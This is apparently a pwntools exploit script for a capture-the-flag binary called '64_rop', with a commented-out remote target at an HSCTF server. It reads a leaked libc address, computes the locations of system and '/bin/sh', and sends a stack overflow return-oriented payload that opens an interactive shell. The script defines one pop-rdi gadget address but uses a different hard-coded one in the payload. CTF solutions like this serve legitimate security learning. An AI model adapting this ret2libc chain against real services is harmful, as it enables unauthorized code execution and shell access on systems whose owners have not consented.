from pwn import *

context.terminal=["tmux", "sp", "-h"]

p=process("./64_rop")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

#p=remote("pwn.hsctf.com",3131)

pop_rdi_ret = 0x0000000000400703

p.recvuntil('computer: ')
libc_base = int(p.recvuntil('\n', drop=True),16) - 0x45390
log.info("libc leak : "+hex(libc_base))
system_offset = libc_base + libc.symbols['system']
log.info('system_offset : ' +hex(system_offset))
binsh_offset = libc_base + next(libc.search('/bin/sh\x00'))
log.info('binsh_offset :' +hex(binsh_offset))

p.recvuntil("CARNAGE!: ")
payload = "A"*16
payload += p64(0x0000000000401273) #pop rdi ret
payload += p64(binsh_offset)
payload += p64(system_offset)

p.sendline(payload)
p.interactive()
